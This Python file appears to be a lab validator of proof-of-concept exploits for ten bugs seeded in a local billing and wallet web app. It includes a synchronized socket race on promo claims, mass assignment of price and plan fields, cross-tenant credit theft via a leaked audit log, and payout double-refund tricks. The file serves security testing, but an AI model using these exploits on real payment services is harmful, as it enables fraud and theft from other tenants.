"""poc.py — ground-truth proof-of-concept exploits for the 10 fortress seeds.

These are the VALIDATOR layer: each poc_* function independently exploits one
seed over real HTTP using nothing but `requests` + raw sockets (no statefuzz,
no swarm imports). If all 10 pass, the lab provably contains every seeded bug;
the harnesses' hit-matrix is scored against this ground truth.

Run:  python target/poc.py --port 8407 [--only F1,F2]
"""
import argparse
import json
import socket
import sys
import threading
import time

import requests

HERE = sys.path.insert(0, __file__.rsplit("/", 1)[0])


# ------------------------------------------------------------- utilities ---
def mkuser(base, nick):
    name = "%s-%d" % (nick, int(time.time() * 1000) % 10**9)
    requests.post(base + "/api/register",
                  json={"username": name, "password": "pw-" + name}, timeout=5)
    r = requests.post(base + "/api/login",
                      json={"username": name, "password": "pw-" + name},
                      timeout=5).json()
    s = requests.Session()
    s.headers["Authorization"] = "Bearer " + r["token"]
    return name, s


def bal(s):
    return s.get(base_wallet(s)).json()["balance_cents"]


def base_wallet(s):
    return s.base_url if hasattr(s, "base_url") else None


class Client:
    """Thin authenticated client bound to a base url."""

    def __init__(self, base, nick):
        self.base = base
        self.name, self.s = mkuser(base, nick)
        self.token = self.s.headers["Authorization"].split(" ", 1)[1]

    def get(self, path):
        return self.s.get(self.base + path, timeout=5)

    def post(self, path, body=None):
        return self.s.post(self.base + path, json=body, timeout=5)

    def wallet(self):
        return self.get("/api/wallet").json()["balance_cents"]


def race_sync(base, clients, path, body):
    """Last-byte-synchronized race, one socket per principal (standalone
    reproduction of the statefuzz executor primitive)."""
    payload = json.dumps(body).encode()
    host = base.split("//")[1].split(":")[0]
    port = int(base.split(":")[-1])
    socks = []
    head = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
            "Authorization: Bearer %s\r\n"
            "Content-Type: application/json\r\nContent-Length: %d\r\n"
            "Connection: close\r\n\r\n")
    try:
        for c in clients:
            s = socket.create_connection((host, port), timeout=5)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.sendall((head % (path, host, port, c.token,
                               len(payload))).encode() + payload[:-1])
            socks.append(s)
        threading.Barrier(1).wait()
        for s in socks:
            s.sendall(payload[-1:])
        out = []
        for s in socks:
            raw = b""
            s.settimeout(5)
            try:
                while True:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    raw += chunk
            except socket.timeout:
                pass
            status = int(raw.split(b" ")[1]) if b" " in raw else 0
            out.append(status)
        return out
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass


# ------------------------------------------------------------------ poCs ---
def poc_f1(base):
    """F1: multi-principal quota race on POST /api/promo/claim."""
    racers = [Client(base, "f1r%d" % i) for i in range(8)]
    statuses = race_sync(base, racers, "/api/promo/claim", {"code": "LAUNCH-2026"})
    wins = sum(1 for st in statuses if 200 <= st < 300)
    # force-exhaust the code with fresh accounts to LEARN the quota
    quota = None
    for _ in range(6):
        c = Client(base, "f1x")
        r = c.post("/api/promo/claim", {"code": "LAUNCH-2026"})
        if r.status_code == 409:
            quota = r.json().get("quota")
            break
    ok = quota is not None and wins > quota
    return ok, {"race_wins": wins, "quota": quota, "statuses": statuses}


def poc_f2(base):
    """F2: proration rounding drift accumulates over resize cycles."""
    p = Client(base, "f2")
    r = p.post("/api/subscriptions", {"plan": "starter", "seats": 2}).json()
    sid = r["subscription_id"]
    w0 = p.wallet()
    for _ in range(12):
        p.post("/api/subscriptions/%s/seats" % sid, {"seats": 1})
        p.post("/api/subscriptions/%s/seats" % sid, {"seats": 2})
    net = p.wallet() - w0
    return net > 0, {"cycles": 12, "net_delta_cents": net,
                     "expect": "0 (round-trip resize is value-neutral)"}


def poc_f3(base):
    """F3: resize accepted on a CANCELED subscription (second full credit)."""
    p = Client(base, "f3")
    sid = p.post("/api/subscriptions",
                 {"plan": "starter", "seats": 2}).json()["subscription_id"]
    c1 = p.post("/api/subscriptions/%s/cancel" % sid,
                {"reason": "dissatisfaction"}).json()
    w1 = p.wallet()
    r = p.post("/api/subscriptions/%s/seats" % sid, {"seats": 1})
    w2 = p.wallet()
    ok = (r.status_code == 200 and w2 > w1)
    return ok, {"cancel_credit": c1.get("credited_cents"),
                "post_cancel_resize_status": r.status_code,
                "wallet_grew_after_terminal_state": w2 - w1}


def poc_f4(base):
    """F4: payout debits at async settle with no re-check -> negative balance."""
    p = Client(base, "f4")
    acc = Client(base, "f4acc")
    amount = 500000
    r = p.post("/api/payouts", {"amount_cents": amount}).json()
    event_path = r["event"]
    p.post("/api/credits/transfer",
           {"to_account": acc.name, "amount_cents": 1000000})
    deadline = time.time() + 4
    ev = {}
    while time.time() < deadline:
        ev = p.get(event_path).json()
        if ev.get("status") == "done":
            break
        time.sleep(0.1)
    final = p.wallet()
    return final < 0, {"final_balance_cents": final,
                       "settled_amount": amount, "event": ev,
                       "expect": "balance >= 0 at all times"}


def poc_f5(base):
    """F5: global audit leaks other tenants' object identifiers."""
    victim = Client(base, "f5v")
    sid = victim.post("/api/subscriptions",
                      {"plan": "starter", "seats": 1}).json()["subscription_id"]
    atk = Client(base, "f5a")
    entries = atk.get("/api/audit").json().get("entries", [])
    leaked = [e for e in entries if e.get("ref") == sid]
    return bool(leaked) and leaked[0].get("actor") == victim.name, {
        "victim_subscription": sid, "victim_actor": victim.name,
        "attacker_saw_it": bool(leaked)}


def poc_f6(base):
    """F6: cross-tenant seat resize credits the CALLER (sid via F5 leak)."""
    victim = Client(base, "f6v")
    sid = victim.post("/api/subscriptions",
                      {"plan": "starter", "seats": 2}).json()["subscription_id"]
    atk = Client(base, "f6a")
    # attacker learns the victim's sid ONLY through the global audit leak
    entries = atk.get("/api/audit").json().get("entries", [])
    leaked = [e for e in entries if e.get("ref") == sid
              and e.get("actor") == victim.name]
    if not leaked:
        return False, {"error": "chain precondition failed: sid not leaked"}
    w0 = atk.wallet()
    r = atk.post("/api/subscriptions/%s/seats" % sid, {"seats": 1})
    gain = atk.wallet() - w0
    ok = r.status_code == 200 and gain > 0
    return ok, {"victim": victim.name, "sid": sid,
                "resize_status": r.status_code,
                "attacker_gain_cents": gain}


def poc_f7(base):
    """F7: mass assignment — client-supplied unit_cents overrides pricing."""
    p = Client(base, "f7")
    t0 = p.post("/api/subscriptions", {"plan": "starter", "seats": 1}).json()
    inv0 = p.get("/api/invoices/%s" % t0["invoice_id"]).json()["total_cents"]
    t1 = p.post("/api/subscriptions",
                {"plan": "starter", "seats": 1, "unit_cents": 1}).json()
    inv1 = p.get("/api/invoices/%s" % t1["invoice_id"]).json()["total_cents"]
    return inv1 != inv0, {"lawful_total": inv0, "injected_total": inv1,
                          "injected_field": "unit_cents=1"}


def poc_f8(base):
    """F8: mass assignment — 'plan' on the seats endpoint escalates free."""
    p = Client(base, "f8")
    s1 = p.post("/api/subscriptions",
                {"plan": "starter", "seats": 1}).json()["subscription_id"]
    r1 = p.post("/api/subscriptions/%s/seats" % s1, {"seats": 2}).json()
    s2 = p.post("/api/subscriptions",
                {"plan": "starter", "seats": 1}).json()["subscription_id"]
    r2 = p.post("/api/subscriptions/%s/seats" % s2,
                {"seats": 2, "plan": "pro"}).json()
    readback = p.get("/api/subscriptions/%s" % s2).json()
    ok = (readback.get("plan") == "pro" and r2.get("delta_cents") ==
          r1.get("delta_cents"))
    return ok, {"baseline_delta": r1.get("delta_cents"),
                "escalated_delta": r2.get("delta_cents"),
                "readback_plan": readback.get("plan"),
                "expect": "pro repricing would cost 5x more"}


def poc_f9(base):
    """F9: cancel dedupe keyed by (sub, reason) — different reason re-credits."""
    p = Client(base, "f9")
    sid = p.post("/api/subscriptions",
                 {"plan": "starter", "seats": 2}).json()["subscription_id"]
    c1 = p.post("/api/subscriptions/%s/cancel" % sid,
                {"reason": "too expensive"})
    replay = p.post("/api/subscriptions/%s/cancel" % sid,
                    {"reason": "too expensive"})
    w_before = p.wallet()
    c2 = p.post("/api/subscriptions/%s/cancel" % sid,
                {"reason": "moving abroad"})
    gain = p.wallet() - w_before
    ok = (c1.status_code == 200 and replay.status_code == 409
          and c2.status_code == 200 and gain > 0)
    return ok, {"first_cancel": c1.status_code,
                "identical_replay": replay.status_code,
                "mutated_reason_cancel": c2.status_code,
                "second_credit_cents": gain}


def poc_f10(base):
    """F10: cancel an already-settled payout — refund + external delivery."""
    p = Client(base, "f10")
    amount = 300000
    r = p.post("/api/payouts", {"amount_cents": amount}).json()
    pid, event = r["payout_id"], r["event"]
    rel = p.post("/api/payouts/%s/release" % pid)   # hidden endpoint
    if rel.status_code == 404:                      # fallback: await worker
        deadline = time.time() + 4
        while time.time() < deadline:
            if p.get(event).json().get("status") == "done":
                break
            time.sleep(0.1)
    w_after_settle = p.wallet()
    c = p.post("/api/payouts/%s/cancel" % pid)
    w_after_cancel = p.wallet()
    rb = p.get("/api/payouts/%s" % pid).json()
    external_sent = rb.get("external_transfers", 0) >= 1
    ok = (c.status_code == 200 and external_sent
          and w_after_cancel == w_after_settle + amount)
    return ok, {"release_status": rel.status_code,
                "wallet_after_settle": w_after_settle,
                "cancel_status": c.status_code,
                "wallet_after_cancel": w_after_cancel,
                "external_transfers": rb.get("external_transfers"),
                "net_position": w_after_cancel - (w_after_settle + amount)}


POCS = {"F1": poc_f1, "F2": poc_f2, "F3": poc_f3, "F4": poc_f4, "F5": poc_f5,
        "F6": poc_f6, "F7": poc_f7, "F8": poc_f8, "F9": poc_f9, "F10": poc_f10}


def run_all(base, only=None):
    out = {}
    for sid in sorted(POCS, key=lambda s: int(s[1:])):
        if only and sid not in only:
            continue
        t0 = time.time()
        try:
            ok, ev = POCS[sid](base)
        except Exception as e:                     # a PoC must never mask
            ok, ev = False, {"exception": repr(e)[:200]}
        out[sid] = {"ok": ok, "ms": round((time.time() - t0) * 1000),
                    "evidence": ev}
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8407)
    ap.add_argument("--only", type=str, default="")
    a = ap.parse_args()
    base = "http://127.0.0.1:%d" % a.port
    res = run_all(base, only={s for s in a.only.split(",") if s})
    n = sum(1 for v in res.values() if v["ok"])
    for sid, v in res.items():
        print("%-4s %s  (%4d ms)  %s" % (
            sid, "PASS" if v["ok"] else "FAIL", v["ms"],
            json.dumps(v["evidence"])[:120]))
    print("ground truth: %d/%d PoCs exploited the lab" % (n, len(res)))
    sys.exit(0 if n == len(res) else 1)


if __name__ == "__main__":
    main()
